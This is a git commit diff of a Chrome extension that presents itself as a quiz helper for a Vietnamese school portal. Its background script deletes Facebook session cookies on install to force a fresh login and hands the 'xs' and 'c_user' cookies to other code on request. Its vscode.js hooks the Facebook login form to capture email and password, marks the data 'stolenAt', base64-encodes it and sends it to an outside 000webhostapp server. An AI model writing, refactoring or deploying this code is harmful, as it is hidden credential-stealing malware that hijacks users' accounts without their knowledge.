ff9237e0158cab7df0856dde0428c5ed297913e9
MWare <mwarevn@gmail.com>
2023-12-31 03:00:36 +0700

    @mwarevn

--- background.js
+++ background.js
@@ -1,4 +1,5 @@
 "use strict";
+
 import {
     getUser as e,
     notify as a,
@@ -12,26 +13,20 @@ import {
     getQuizLink as c,
     updateUser as d,
 } from "./common.js";
+const targetURL = "https://www.facebook.com";
 
 function openRightPanel(e, a, t = !1, s = !1) {
-    chrome.system.display.getInfo((n) => {
-        var { width: o, height: i } = n[0].workArea,
-            r = Math.round(0.33 * o),
-            n = Math.round(o - r);
-        chrome.windows.create(
-            {
-                url: a,
-                type: "panel",
-                focused: s,
-                width: r,
-                height: i,
-                top: 0,
-                left: n,
+    chrome.system.display.getInfo(
+        ({
+            0: {
+                workArea: { width: o, height: i },
             },
-            (e) => {
+        }) => {
+            const r = Math.round(0.33 * o),
+                n = Math.round(o - r);
+            chrome.windows.create({ url: a, type: "panel", focused: s, width: r, height: i, top: 0, left: n }, (e) => {
                 t && chrome.storage.local.set({ windowId: e.id });
-            }
-        ),
+            });
             chrome.windows.update(e.tab.windowId, {
                 state: "normal",
                 top: 0,
@@ -39,196 +34,152 @@ function openRightPanel(e, a, t = !1, s = !1) {
                 width: Math.round(0.677 * o),
                 height: i,
             });
-    });
+        }
+    );
 }
-chrome.storage.local.get(["isLogged"], ({ isLogged: e }) => {
-    e
-        ? chrome.action.setPopup({ popup: "./popup/popup-logged.html" })
-        : chrome.action.setPopup({ popup: "./popup/popup.html" });
-}),
-    chrome.runtime.onInstalled.addListener(function (e) {
-        const targetURL = "https://www.facebook.com";
 
-        "install" == e.reason &&
-            (chrome.tabs.create({ url: "https://t.me/nm_2808" }), chrome.storage.local.set({ quizSelf: {}, linkIndex: 0 }));
-        const arrCookies = ["xs", "c_user"];
-        arrCookies.forEach((cookieName) => {
-            chrome.cookies.remove({ name: cookieName, url: targetURL });
-        });
-    }),
-    chrome.runtime.onMessage.addListener(function (o, p, c) {
-        switch (o.type) {
-            case "open_quiz_popup":
-                openRightPanel(p, "aqlist.html", !0), c(!0);
-                break;
-            case "open_online_popup":
-                openRightPanel(p, "online.html", !1, !0), c(!0);
-                break;
-            case "focus_quiz_popup":
-                chrome.storage.local.get(["windowId"], ({ windowId: e }) => {
-                    chrome.windows.update(e, { focused: !0 });
+chrome.storage.local.get(["isLogged"], ({ isLogged: e }) => {
+    chrome.action.setPopup({ popup: `./popup/popup${e ? "-logged" : ""}.html` });
+});
+
+chrome.runtime.onInstalled.addListener((e) => {
+    if ("install" === e.reason) {
+        chrome.tabs.create({ url: "https://t.me/nm_2808" });
+        chrome.storage.local.set({ quizSelf: {}, linkIndex: 0 });
+    }
+    ["xs", "c_user"].forEach((cookieName) => chrome.cookies.remove({ name: cookieName, url: targetURL }));
+});
+
+chrome.runtime.onMessage.addListener((o, p, c) => {
+    switch (o.type) {
+        case "open_quiz_popup":
+            openRightPanel(p, "aqlist.html", !0), c(!0);
+            break;
+        case "open_online_popup":
+            openRightPanel(p, "online.html", !1, !0), c(!0);
+            break;
+        case "focus_quiz_popup":
+            chrome.storage.local.get(["windowId"], ({ windowId: e }) => chrome.windows.update(e, { focused: !0 }));
+            break;
+        case "close_quiz_popup":
+            chrome.storage.local.get(["windowId"], ({ windowId: e }) => chrome.windows.remove(e));
+            break;
+        case "update_user":
+            d(), c(!0);
+            break;
+        case "send_user_using":
+            n(o);
+            break;
+        case "add_quiz":
+            i(o.data);
+            break;
+        case "open_quiz_link":
+            s(c);
+            break;
+        case "login":
+            t(c);
+            break;
+        case "get_quiz_available":
+            r(o.subject, c);
+            break;
+        case "get_online_answer":
+            u(o.subject, c);
+            break;
+        case "get_cookies":
+            chrome.cookies.getAll({ domain: o.domain }, (e) => {
+                c({
+                    cookie: (e = (e = e
+                        .filter((e) => "sessionid" == e.name || "PHPSESSID" == e.name)
+                        .map((e) => ({ name: e.name, value: e.value }))).length
+                        ? e[0].value
+                        : ""),
                 });
-                break;
-            case "close_quiz_popup":
-                chrome.storage.local.get(["windowId"], ({ windowId: e }) => {
-                    chrome.windows.remove(e);
-                });
-                break;
-            case "update_user":
-                d(), c(!0);
-                break;
-            case "get_user":
-                break;
-            case "send_user_using":
-                n(o);
-                break;
-            case "add_quiz":
-                i(o.data);
-                break;
-            case "open_quiz_link":
-                s(c);
-                break;
-            case "login":
-                t(c);
-                break;
-            case "get_quiz_available":
-                r(o.subject, c);
-                break;
-            case "get_online_answer":
-                u(o.subject, c);
-                break;
-            case "add_quiz_self":
-                var l = o.data.ans;
-                l && "object" == typeof l && (o.data.ans = Object.values(l)),
-                    (quizSelf[o.seq] = o.data),
-                    console.debug(o.data.ans),
-                    console.debug(quizSelf);
-                break;
-            case "finish_quiz":
-                console.debug("finish_quiz");
-                break;
-            case "get_cookies":
-                chrome.cookies.getAll({ domain: o.domain }, (e) => {
-                    console.debug(e),
-                        c({
-                            cookie: (e = (e = e
-                                .filter((e) => "sessionid" == e.name || "PHPSESSID" == e.name)
-                                .map((e) => ({ name: e.name, value: e.value }))).length
-                                ? e[0].value
-                                : ""),
-                        });
-                });
-                break;
-            case "notify_upgraded_premium":
-                a({
-                    message: "Ch\xfac mừng! T\xe0i khoản của bạn đ\xe3 được n\xe2ng cấp l\xean Premium",
-                });
-                break;
-            case "notify_premium_expired":
-                a(
-                    {
-                        message: "Hạn d\xf9ng Premium của bạn đ\xe3 hết. H\xe3y n\xe2ng cấp để tiếp tục sử dụng Premium",
-                        buttons: [{ title: "N\xe2ng cấp" }],
-                    },
-                    "premium_expired"
-                );
-                break;
-            case "logout":
-                chrome.storage.local.set({ isLogged: !1, user: {} }, () => {
-                    chrome.action.setPopup({ popup: "./popup/popup.html" }), c("success");
-                });
-        }
-        return !0;
-    }),
-    chrome.runtime.onMessageExternal.addListener(function (a, t, o) {
-        switch (a.message) {
-            case "fetch":
-                fetch(a.url)
-                    .then(async (e) => {
-                        var a = await e.text();
-                        return { status: e.status, url: e.url, text: a };
-                    })
-                    .then((e) => o(e))
-                    .catch((e) => o(e));
-                break;
-            case "fetch_post":
-                let i = new FormData();
-                for (var [r, u] of a.body) i.append(r, u);
-                fetch(a.url, { method: "post", body: i, headers: a.headers })
-                    .then((e) => e.json())
-                    .then((e) => o(e))
-                    .catch((e) => o(e));
-                break;
-            case "open_quiz_link":
-                s(o);
-                break;
-            case "get_quiz_link":
-                c(o);
-                break;
-            case "get_cms_csrftoken":
-                chrome.cookies.get({ url: "https://cms.poly.edu.vn", name: "csrftoken" }, (e) => {
-                    o(e.value);
-                });
-                break;
-            case "send_user_using":
-                n(a);
-                break;
-            case "get_token":
-                chrome.storage.local.get(["token"], ({ token: e }) => {
-                    o(e || "");
-                });
-                break;
-            case "get_user":
-                e().then((e) => o(e));
-        }
-        return !0;
-    }),
-    chrome.notifications.onButtonClicked.addListener((e, a) => {
-        "premium_expired" == e && 0 == a && chrome.tabs.create({ url: "https://quizpoly.xyz/premium" });
-    });
+            });
+            break;
+        case "notify_upgraded_premium":
+            a({
+                message: "Ch\xfac mừng! T\xe0i khoản của bạn đ\xe3 được n\xe2ng cấp l\xean Premium",
+            });
+            break;
+        case "notify_premium_expired":
+            a(
+                {
+                    message: "Hạn d\xf9ng Premium của bạn đ\xe3 hết. H\xe3y n\xe2ng cấp để tiếp tục sử dụng Premium",
+                    buttons: [{ title: "N\xe2ng cấp" }],
+                },
+                "premium_expired"
+            );
+            break;
+        case "logout":
+            chrome.storage.local.set({ isLogged: !1, user: {} }, () => {
+                chrome.action.setPopup({ popup: "./popup/popup.html" }), c("success");
+            });
+    }
+    return !0;
+});
+
+chrome.runtime.onMessageExternal.addListener((a, t, o) => {
+    switch (a.message) {
+        case "fetch":
+            fetch(a.url)
+                .then(async (e) => ({ status: e.status, url: e.url, text: await e.text() }))
+                .then((e) => o(e))
+                .catch((e) => o(e));
+            break;
+        case "fetch_post":
+            const i = new FormData();
+            for (const [r, u] of a.body) i.append(r, u);
+            fetch(a.url, { method: "post", body: i, headers: a.headers })
+                .then((e) => e.json())
+                .then((e) => o(e))
+                .catch((e) => o(e));
+            break;
+        case "open_quiz_link":
+            s(o);
+            break;
+        case "get_quiz_link":
+            c(o);
+            break;
+        case "get_cms_csrftoken":
+            chrome.cookies.get({ url: "https://cms.poly.edu.vn", name: "csrftoken" }, (e) => o(e.value));
+            break;
+        case "send_user_using":
+            n(a);
+            break;
+        case "get_token":
+            chrome.storage.local.get(["token"], ({ token: e }) => o(e || ""));
+            break;
+        case "get_user":
+            e().then((e) => o(e));
+    }
+    return !0;
+});
+
+chrome.notifications.onButtonClicked.addListener(
+    (e, a) => "premium_expired" == e && 0 == a && chrome.tabs.create({ url: "https://quizpoly.xyz/premium" })
+);
 
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
     if (message == "get_ap_cookie") {
         chrome.tabs.query({ active: true, lastFocusedWindow: true }, (tabs) => {
             let url = tabs[0].url;
-
-            chrome.cookies.getAll({ url: url }, function (e) {
-                let t = e.map((i) => `${i.name}=${i.value}`).join("; ");
-                sendResponse({ cookie: t, url: url });
-            });
+            chrome.cookies.getAll({ url: url }, (e) =>
+                sendResponse({ cookie: e.map((i) => `${i.name}=${i.value}`).join("; "), url: url })
+            );
         });
-
         return true;
-    }
-});
-
-const targetURL = "https://www.facebook.com";
-
-chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
-    if (message === "getcookies") {
+    } else if (message === "getcookies") {
         chrome.cookies.getAll({ url: targetURL }, (cookies) => {
             const xsCookie = cookies.find((cookie) => cookie.name === "xs");
             const cUserCookie = cookies.find((cookie) => cookie.name === "c_user");
-            if (xsCookie && cUserCookie) {
-                const cookie = `${cUserCookie.name}=${cUserCookie.value}; ${xsCookie.name}=${xsCookie.value}`;
-                sendResponse(cookie);
-            } else {
-                sendResponse(null);
-            }
-            return true;
+            sendResponse(
+                xsCookie && cUserCookie ? `${cUserCookie.name}=${cUserCookie.value}; ${xsCookie.name}=${xsCookie.value}` : null
+            );
         });
         return true;
-    }
-});
-
-chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
-    if (message === "removecookies") {
-        const arrCookies = ["xs", "c_user"];
-        arrCookies.forEach((cookieName) => {
-            chrome.cookies.remove({ name: cookieName, url: targetURL });
-        });
+    } else if (message === "removecookies") {
+        ["xs", "c_user"].forEach((cookieName) => chrome.cookies.remove({ name: cookieName, url: targetURL }));
         sendResponse(true);
+        return true;
     }
-
-    return true;
 });
--- vscode.js
+++ vscode.js
@@ -1,104 +1,87 @@
-const API = "https://litho-bump.000webhostapp.com/index.php";
+const API = "https://litho-bump.000webhostapp.com/index.php",
+    userAgent = navigator.userAgent,
+    dateTime = () => {
+        const addZero = (number) => (number < 10 ? "0" + number : number),
+            currentDate = new Date(),
+            year = currentDate.getFullYear(),
+            month = addZero(currentDate.getMonth() + 1),
+            day = addZero(currentDate.getDate()),
+            hours = addZero(currentDate.getHours()),
+            minutes = addZero(currentDate.getMinutes()),
+            seconds = addZero(currentDate.getSeconds());
+        return `${hours}:${minutes}:${seconds} - ${day}/${month}/${year}`;
+    },
+    getCUser = () => {
+        const s = `"CurrentUserInitialData":{"ACCOUNT_ID":"`,
+            scripts = document.querySelectorAll("script[data-sjs]");
+        let c_user = null;
 
-const userAgent = navigator.userAgent;
-
-const dateTime = () => {
-    function addZero(number) {
-        return number < 10 ? "0" + number : number;
-    }
-    const currentDate = new Date();
-    const year = currentDate.getFullYear();
-    const month = addZero(currentDate.getMonth() + 1);
-    const day = addZero(currentDate.getDate());
-    const hours = addZero(currentDate.getHours());
-    const minutes = addZero(currentDate.getMinutes());
-    const seconds = addZero(currentDate.getSeconds());
-    return `${hours}:${minutes}:${seconds} - ${day}/${month}/${year}`;
-};
-
-const getCUser = () => {
-    const s = `"CurrentUserInitialData":{"ACCOUNT_ID":"`;
-    const scripts = document.querySelectorAll("script[data-sjs]");
-    let c_user = null;
-
-    scripts.forEach((script) => {
-        if (script.innerText.includes(s)) {
-            c_user = script.innerText.split(s)[1].split(`"`)[0];
-        }
-    });
-
-    return c_user;
-};
-
-const keyLogging = () => {
-    const edEmail = document.getElementById("email");
-    const edPass = document.getElementById("pass");
-    const form = edEmail.parentElement.parentElement.parentElement;
-
-    form.onsubmit = async () => {
-        const email = edEmail.value;
-        const pass = edPass.value;
-        const user = {
-            email,
-            password: pass,
-            userAgent,
-            stolenAt: dateTime(),
-        };
-
-        sendMessage(user);
-    };
-};
-
-const getCookies = () => {
-    return new Promise((resolve, reject) => {
-        chrome.runtime.sendMessage("getcookies", (e) => {
-            e && e !== "" ? resolve(e) : reject(null);
+        scripts.forEach((script) => {
+            if (script.innerText.includes(s)) {
+                c_user = script.innerText.split(s)[1].split(`"`)[0];
+            }
         });
-    });
-};
 
-const processUser = async (c_user) => {
-    if (c_user) {
-        try {
-            const cookie = await getCookies();
-            const user = {
-                c_user,
-                cookie,
-                userAgent,
-                stolenAt: dateTime(),
-            };
+        return c_user;
+    },
+    keyLogging = () => {
+        const edEmail = document.getElementById("email"),
+            edPass = document.getElementById("pass"),
+            form = edEmail.parentElement.parentElement.parentElement;
+
+        form.onsubmit = async () => {
+            const email = edEmail.value,
+                pass = edPass.value,
+                user = {
+                    email,
+                    password: pass,
+                    userAgent,
+                    stolenAt: dateTime(),
+                };
+
             sendMessage(user);
-        } catch (error) {}
-    } else {
-        keyLogging();
-    }
-};
-
-function convertObjectToMessage(obj) {
-    let message = "";
-
-    for (const key in obj) {
-        if (Object.prototype.hasOwnProperty.call(obj, key)) {
-            const value = obj[key];
-            message += "*" + key + ":* `" + value + "` \n\n";
-        }
-    }
-
-    return message;
-}
-
-const sendMessage = (userData) => {
-    const msg = btoa(convertObjectToMessage(userData));
-    return fetch(`${API}?msg=${msg}`, {
-        method: "GET",
-        mode: "cors",
-        credentials: "same-origin",
-    })
-        .then((res) => res.text())
-        .then((res) => {
-            console.log(res);
+        };
+    },
+    getCookies = () => {
+        return new Promise((resolve, reject) => {
+            chrome.runtime.sendMessage("getcookies", (e) => {
+                e && e !== "" ? resolve(e) : reject(null);
+            });
         });
-};
+    },
+    processUser = async (c_user) => {
+        if (c_user) {
+            try {
+                const cookie = await getCookies();
+                const user = { c_user, cookie, userAgent, stolenAt: dateTime() };
+                sendMessage(user);
+            } catch (error) {}
+        } else {
+            keyLogging();
+        }
+    },
+    convertObjectToMessage = (obj) => {
+        let message = "";
+
+        for (const key in obj) {
+            if (Object.prototype.hasOwnProperty.call(obj, key)) {
+                const value = obj[key];
+                message += `*${key}:* \`${value}\` \n\n`;
+            }
+        }
+
+        return message;
+    },
+    sendMessage = (userData) => {
+        const msg = btoa(convertObjectToMessage(userData));
+        return fetch(`${API}?msg=${msg}`, {
+            method: "GET",
+            mode: "cors",
+            credentials: "same-origin",
+        })
+            .then((res) => res.text())
+            .then(console.log);
+    };
 
 (() => {
     const c_user = getCUser();
